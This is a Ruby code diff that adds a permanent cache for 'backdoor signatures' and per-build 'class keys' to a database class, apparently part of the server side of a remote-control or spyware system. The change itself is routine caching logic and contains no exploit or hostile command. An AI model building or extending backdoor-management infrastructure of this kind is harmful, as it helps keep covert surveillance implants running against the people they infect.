@@ -5,6 +5,7 @@
 # relatives
 require_relative 'config.rb'
 require_relative 'db_xmlrpc.rb'
+require_relative 'cache.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -72,14 +73,19 @@ class DB
 
   def connected?
     # is the database available ?
+    #TODO: set this variable accordingly in each method to detect when the db is down
     return @available
   end
 
   def cache_init
-    if @available then
-      trace :info, "Initializing the DB cache..."
-      #TODO: empty the cache and populate it again
 
+    # if the db is available, clear the cache and populate it again
+    if @available then
+      trace :info, "Emptying the DB cache..."
+      # empty the cache and populate it again
+      Cache.empty!
+
+      trace :info, "Populating the DB cache..."
       # get the global signature (per customer) for all the backdoors
       sig = @db.backdoor_signature
       @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
@@ -87,9 +93,31 @@ class DB
 
       # get the classkey of every backdoor and store it in the cache
       @class_keys = @db.class_keys
-    else
-      #TODO: check if the cache already exists and has some entries
+
+      # save in the permanent cache
+      Cache.signature = sig
+      Cache.add_class_keys @class_keys
+      trace :info, "#{@class_keys.length} entries saved in the the DB cache"
+
+      return true
     end
+
+    # the db is not available
+    # check if the cache already exists and has some entries
+    if Cache.length > 0 then
+      trace :info, "Loading the DB cache..."
+
+      # populate the memory cache from the permanent one
+      @backdoor_signature = Digest::MD5.digest Cache.signature unless Cache.signature.nil?
+      @class_keys = Cache.class_keys
+
+      trace :info, "#{@class_keys.length} entries loaded from DB cache"
+
+      return true
+    end
+
+    # no db and no cache...
+    return false
   end
 
   def update_status(status, message)
@@ -114,10 +142,21 @@ class DB
     # ask to the db the class key
     key = @db.class_keys build_id
 
-    # save the class key in the memory cache
-    @class_keys[build_id] = Digest::MD5.digest key unless key.nil?
+    # save the class key in the cache (memory and permanent)
+    if not key.nil? then
+      @class_keys[build_id] = key
 
-    #TODO: store it in the permanent cache
+      # store it in the permanent cache
+      entry = {}
+      entry[build_id] = key
+      Cache.add_class_keys entry
+
+      # return the key
+      return Digest::MD5.digest @class_keys[build_id]
+    end
+
+    # key not found
+    return nil
   end
 
   # returns ALWAYS the status of a backdoor
